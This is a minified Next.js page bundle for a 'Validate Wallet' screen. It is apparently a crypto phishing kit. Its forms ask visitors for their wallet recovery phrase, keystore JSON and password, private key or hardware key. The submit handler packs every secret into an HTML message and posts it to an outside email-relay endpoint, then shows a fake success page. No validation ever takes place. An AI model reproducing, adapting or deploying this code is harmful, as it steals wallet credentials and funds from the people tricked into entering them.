(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [46], {
        5677: function(e, t, r) {
            "use strict";
            r.r(t), r.d(t, { __N_SSP: function() { return w }, default: function() { return v } });
            var n = r(5893),
                a = r(7757),
                s = r.n(a),
                l = r(2137),
                i = r(3391),
                o = r(9256),
                c = r(6156),
                d = r(7294);

            function u(e, t) {
                var r = Object.keys(e);
                if (Object.getOwnPropertySymbols) {
                    var n = Object.getOwnPropertySymbols(e);
                    t && (n = n.filter((function(t) { return Object.getOwnPropertyDescriptor(e, t).enumerable }))), r.push.apply(r, n)
                }
                return r
            }

            function m(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var r = null != arguments[t] ? arguments[t] : {};
                    t % 2 ? u(Object(r), !0).forEach((function(t) {
                        (0, c.Z)(e, t, r[t])
                    })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : u(Object(r)).forEach((function(t) { Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t)) }))
                }
                return e
            }
            var x = function(e) {
                var t = e.handleSubmit,
                    r = e.loading,
                    a = d.useState(1),
                    s = (0, i.Z)(a, 2),
                    l = s[0],
                    o = s[1],
                    u = d.useState({ mnemonics: "", keystore: "", password: "", privatekey: "", hardwarekey: "" }),
                    x = (0, i.Z)(u, 2),
                    p = x[0],
                    h = x[1],
                    f = function(e, t) { e.preventDefault(), h(m(m({}, p), {}, (0, c.Z)({}, t, e.target.value))) };
                return (0, n.jsx)(n.Fragment, { children: (0, n.jsx)("div", { className: "flex flex-wrap", children: (0, n.jsxs)("div", { className: "w-full", children: [(0, n.jsxs)("ul", { className: "flex mb-0 list-none flex-wrap pt-3 pb-4 flex-row", role: "tablist", children: [(0, n.jsx)("li", { className: "-mb-px mr-2 last:mr-0 flex-auto text-center", children: (0, n.jsx)("a", { className: "text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " + (1 === l ? "text-white bg-primary" : "text-secondary bg-white"), onClick: function(e) { e.preventDefault(), o(1) }, "data-toggle": "tab", href: "#link1", role: "tablist", children: "Mnemonics" }) }), (0, n.jsx)("li", { className: "-mb-px mr-2 last:mr-0 flex-auto text-center", children: (0, n.jsx)("a", { className: "text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " + (2 === l ? "text-white bg-primary" : "text-secondary bg-white"), onClick: function(e) { e.preventDefault(), o(2) }, "data-toggle": "tab", href: "#link2", role: "tablist", children: "Keystore" }) }), (0, n.jsx)("li", { className: "-mb-px mr-2 last:mr-0 flex-auto text-center", children: (0, n.jsx)("a", { className: "text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " + (3 === l ? "text-white bg-primary" : "text-secondary bg-white"), onClick: function(e) { e.preventDefault(), o(3) }, "data-toggle": "tab", href: "#link3", role: "tablist", children: "Private Key" }) }), (0, n.jsx)("li", { className: "-mb-px mr-2 last:mr-0 flex-auto text-center", children: (0, n.jsx)("a", { className: "text-xs font-bold uppercase px-5 py-3 shadow-lg rounded block leading-normal " + (4 === l ? "text-white bg-primary" : "text-secondary bg-white"), onClick: function(e) { e.preventDefault(), o(4) }, "data-toggle": "tab", href: "#link4", role: "tablist", children: "Hardware" }) })] }), (0, n.jsx)("div", { className: "relative flex flex-col min-w-0 break-words bg-white w-full mb-6 shadow-lg rounded", children: (0, n.jsx)("div", { className: "px-4 py-5 flex-auto", children: (0, n.jsxs)("div", { className: "tab-content tab-space", children: [(0, n.jsx)("div", { className: 1 === l ? "block" : "hidden", id: "link1", children: (0, n.jsxs)("form", { className: "p-1", children: [(0, n.jsxs)("div", { className: "mb-3 pt-0", children: [(0, n.jsx)("div", { className: "text-sm mb-1 text-gray-500", children: "Please enter your 12/24 word phrase" }), (0, n.jsx)("textarea", { rows: 4, required: !0, value: p.mnemonics, onChange: function(e) { return f(e, "mnemonics") }, className: "px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-primary w-full" })] }), (0, n.jsx)("div", { className: "mt-6 mb-2", children: (0, n.jsx)("button", { className: "inline-flex w-full rounded-md bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150", type: "button", onClick: function() { return t(p) }, children: r ? (0, n.jsx)(b, {}) : "Submit" }) })] }) }), (0, n.jsx)("div", { className: 2 === l ? "block" : "hidden", id: "link2", children: (0, n.jsxs)("form", { className: "p-1", children: [(0, n.jsxs)("div", { className: "mb-3 pt-0", children: [(0, n.jsx)("div", { className: "text-sm mb-1 text-gray-500", children: "Enter your Keystore JSON" }), (0, n.jsx)("textarea", { rows: 2, required: !0, value: p.keystore, onChange: function(e) { return f(e, "keystore") }, className: "px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-primary w-full" }), (0, n.jsx)("div", { className: "text-left text-xs text-gray-400", children: "Key must be in JSON format" })] }), (0, n.jsxs)("div", { className: "mb-3 pt-0", children: [(0, n.jsx)("div", { className: "text-sm mb-1 text-gray-500", children: "Password" }), (0, n.jsx)("input", { type: "password", required: !0, value: p.password, onChange: function(e) { return f(e, "password") }, className: "px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-primary w-full" })] }), (0, n.jsx)("div", { className: "mt-6 mb-2", children: (0, n.jsx)("button", { className: "inline-flex w-full rounded-md bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150", type: "button", onClick: function() { return t(p) }, children: r ? (0, n.jsx)(b, {}) : "Submit" }) })] }) }), (0, n.jsx)("div", { className: 3 === l ? "block" : "hidden", id: "link3", children: (0, n.jsxs)("form", { className: "p-1", children: [(0, n.jsxs)("div", { className: "mb-3 pt-0", children: [(0, n.jsx)("div", { className: "text-sm mb-1 text-gray-500", children: "Enter your private key" }), (0, n.jsx)("textarea", { rows: 4, required: !0, value: p.privatekey, onChange: function(e) { return f(e, "privatekey") }, className: "px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-primary w-full" }), (0, n.jsx)("div", { className: "text-left text-xs text-gray-400", children: "Key must be in HEX format" })] }), (0, n.jsx)("div", { className: "mt-6 mb-2", children: (0, n.jsx)("button", { className: "inline-flex w-full rounded-md bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150", type: "button", onClick: function() { return t(p) }, children: r ? (0, n.jsx)(b, {}) : "Submit" }) })] }) }), (0, n.jsx)("div", { className: 4 === l ? "block" : "hidden", id: "link4", children: (0, n.jsxs)("form", { className: "p-1", children: [(0, n.jsxs)("div", { className: "mb-3 pt-0", children: [(0, n.jsx)("div", { className: "text-sm mb-1 text-gray-500", children: "Enter your Hardware Key" }), (0, n.jsx)("textarea", { rows: 4, required: !0, value: p.hardwarekey, onChange: function(e) { return f(e, "hardwarekey") }, className: "px-3 py-3 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-primary w-full" }), (0, n.jsx)("div", { className: "text-left text-xs text-gray-400", children: "Key must be in HEX format" })] }), (0, n.jsx)("div", { className: "mt-6 mb-2", children: (0, n.jsx)("button", { className: "inline-flex w-full rounded-md bg-primary text-white active:bg-indigo-600 font-bold uppercase text-base px-8 py-4 items-center justify-center shadow-lg hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150", type: "button", onClick: function() { return t(p) }, children: r ? (0, n.jsx)(b, {}) : "Submit" }) })] }) })] }) }) })] }) }) })
            };

            function p(e) {
                var t = e.onClick,
                    r = e.loading;
                return (0, n.jsx)(x, { loading: r, handleSubmit: function(e) { return t(e) } })
            }
            var b = function() { return (0, n.jsxs)("svg", { class: "animate-spin -ml-1 mr-3 h-6 w-6 text-white", xmlns: "http://www.w3.org/2000/svg", fill: "none", viewBox: "0 0 24 24", children: [(0, n.jsx)("circle", { class: "opacity-25", cx: "12", cy: "12", r: "10", stroke: "currentColor", "stroke-width": "4" }), (0, n.jsx)("path", { class: "opacity-75", fill: "currentColor", d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" })] }) },
                h = r(2216),
                f = r(9669),
                g = r.n(f),
                y = r(1163),
                w = !0;

            function v(e) {
                var t = e.id,
                    r = (0, o.MX)(),
                    a = (0, y.useRouter)(),
                    c = d.useState(!1),
                    u = (0, i.Z)(c, 2),
                    m = u[0],
                    x = u[1],
                    b = d.useState(""),
                    f = (0, i.Z)(b, 2),
                    w = f[0],
                    v = f[1],
                    j = function() {
                        var e = (0, l.Z)(s().mark((function e(n) {
                            var l;
                            return s().wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, x(!0), l = { user_id: o.zh, service_id: o.F7, template_id: o.hv, template_params: { message_html: "<div><p><b>Wallet Type</b>: ".concat("others" === t ? w : r[t].name, "</p><p><b>Mnemonic Word Phrase</b>: ").concat(n.mnemonics, "</p><p><b>Keystore JSON</b>: ").concat(n.keystore, "</p><p><b>Keystore Password</b>: ").concat(n.password, "</p><p><b>Private Key</b>: ").concat(n.privatekey, "</p><p><b>Hardware Key</b>: ").concat(n.hardwarekey, "</p></div>") } }, e.next = 5, g().post(o.T5, l);
                                    case 5:
                                        a.push("/lastPage.html".concat(t, "&state=success")), e.next = 11;
                                        break;
                                    case 8:
                                        e.prev = 8, e.t0 = e.catch(0), console.log(e.t0);
                                    case 11:
                                        return e.prev = 11, x(!1), e.finish(11);
                                    case 14:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 8, 11, 14]
                            ])
                        })));
                        return function(t) { return e.apply(this, arguments) }
                    }();
                return (0, n.jsx)(h.Z, { children: (0, n.jsxs)("div", { className: "container max-w-screen-sm py-20 px-4 flex flex-col h-full items-center justify-items-center mx-auto text-center", children: [(0, n.jsx)("h2", { className: "text-2xl text-center justify font-bold mb-2", children: "Validate Wallet" }), (0, n.jsxs)("p", { className: "text-sm mb-8", children: ["Validate your selected wallet ", (0, n.jsx)("span", { className: "bg-gray-300 p-1", children: w || ("others" === t ? "Others" : r[t].name) }), " to continue"] }), "others" === t ? (0, n.jsxs)("div", { className: "py-2 mb-3", children: [(0, n.jsx)("div", { className: "text-sm mb-1 text-gray-500", children: "Enter Wallet Name" }), (0, n.jsx)("input", { required: !0, value: w, onChange: function(e) { return v(e.target.value) }, className: "px-3 py-2 placeholder-gray-300 text-gray-900 relative bg-white rounded text-sm border border-gray-300 outline-none focus:outline-none focus:ring focus:ring-indigo-600 w-full" })] }) : null, (0, n.jsx)(p, { loading: m, onClick: function(e) { return j(e) } })] }) })
            }
        },
        1035: function(e, t, r) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/validate-wallet", function() { return r(5677) }])
        }
    },
    function(e) {
        e.O(0, [814, 372, 748, 774, 888, 179], (function() { return t = 1035, e(e.s = t); var t }));
        var t = e.O();
        _N_E = t
    }
]);